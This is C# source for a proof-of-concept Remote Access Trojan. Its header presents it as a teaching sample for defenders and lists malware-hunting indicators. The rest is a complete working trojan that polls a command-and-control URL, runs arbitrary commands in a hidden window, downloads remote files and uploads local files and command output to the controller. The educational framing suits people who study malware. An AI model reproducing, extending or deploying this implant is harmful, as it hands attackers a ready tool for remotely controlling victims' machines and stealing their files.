using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace RattyMcRatFace
{
    static class Program
    {
        /// <summary>
        /// This is a basic example / Proof of Concept of a C# RAT (Remote Access Trojan) made by Sean Pierce (@secure_sean)
        /// to demonstrate to defenders the ease, speed, development goals and characteristics of common malware.
        /// This is for educational use only
        /// 
        /// ## Easy for an Attacker to Change:
        /// Hash
        /// PDB String
        /// Compile Time
        /// File Details
        /// 
        /// ## Less Easy for an Attacker to Change:
        /// File Size
        /// Domains
        /// 
        /// ## Harder for an Attacker to Change:
        /// Features
        /// Functionality
        /// Network Traffic
        /// ImpHash
        /// 
        /// ## When hunting for malware Search for:
        /// Small Executable files - scripts, stagers, downloaders, etc.
        /// Freshly compiled and installed executables
        /// Common persistence, malicious/administration functionality
        /// </summary>
        
        [STAThread]
        static void Main()
        {
            // Run the C2 Panel:
            // pip install colorama
            // python RattyMcC2Face.py
            //
            //
            // Simple C2 Test cases without the python C2 Panel:
            // echo "run cmd /c mkdir C:\test" > cmd.html
            // echo "download https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe pp.exe" > download.html
            // echo "download ftp://ftp.chiark.greenend.org.uk/users/sgtatham/putty-latest/w32/putty.exe pp.exe" > download-ftp.html
            // python -m SimpleHTTPServer 80


            String c2 = "http://127.0.0.1/cmd.html";
            Random getrandom = new Random();
            while (true)
            {
                String output = "Command was recieved but there is either no RAT command by that name or there is no output. If there is a RAT command (like 'run', 'upload', or 'download' then you probably need to add code to return the output";
                String cmdString = GetCommand(c2);
                String cmd = cmdString.Split()[0];
                switch (cmd)
                {
                    case "run":                                                     // run mkdir C:\test
                        String programAndArgs = cmdString.Substring(4);             // mkdir C:\test
                        String program = programAndArgs.Split()[0];                 // mkdir
                        String args = programAndArgs.Substring(program.Length);     // C:\test
                        output = ShellExecute(program, args);
                        break;
                    case "download":
	                    output = Download(cmdString.Split()[1], cmdString.Split()[2]);
                        break;
                    case "upload":
                        output = Upload(c2, cmdString.Split()[1]);
                        break;
                    case "exit":
                        return;
                }
                UploadOutput(c2, cmd, output);
            } 
        }



        static String GetCommand(String c2)
        {
            try
            {
                return (new WebClient()).DownloadString(c2);
            }
            catch (System.Net.WebException e)
            {
                return "Failed to get command: " + e.ToString();
            }
        }

        static string ShellExecute(String cmd, String args)
        {
            // Old simple way 
            //  System.Diagnostics.Process.Start("CMD.exe", "/C " + cmd);

            // New way so that we can get output
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = cmd,
                    Arguments = args,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            String output = "";
            try
            {
                proc.Start();

                while (!proc.StandardOutput.EndOfStream)
                {
                    output += proc.StandardOutput.ReadLine() + "\n";

                }
            } catch ( Exception e)
            {
                output = e.ToString();
                output += output + "\n\nCommand Recieved: " + cmd;
                output += output + "\nArgs Recieved:: " + args;
                output += output + "\n\nTry: 'run cmd /c " + cmd + args + "'";
            }
            

            return output;
        }

        static String Download(String url, String fileName)
        {
            try
            {
                (new WebClient()).DownloadFile(url, fileName);
                return "File Attempted to Download";
            }
            catch (System.Net.WebException e)
            {
                return "Failed to Download File: " + e.ToString();
            }
        }

        static String Upload(String url, String fileName)
        {
            try
            {
                byte[] responseArray = (new WebClient()).UploadFile(url, fileName);
                return "UploadFile Returned: " + System.Text.Encoding.ASCII.GetString(responseArray);

                // Another Method: Reading and upload the content of the file
                //string text = System.IO.File.ReadAllText(fileName);
                //return "UploadString Returned: " + (new WebClient()).UploadString(url, text);
            }
            catch (System.Net.WebException e)
            {
                return "Failed to Upload File: " + e.ToString();
            }
        }

        static String UploadOutput(String url, String cmd, String output)
        {
            try
            {
                return (new WebClient()).UploadString(url, ("Output from '" + cmd + "': " + output));
            }
            catch (System.Net.WebException e)
            {
                return "Failed to Upload Output:" + e.ToString();
            }
        }
    }
}
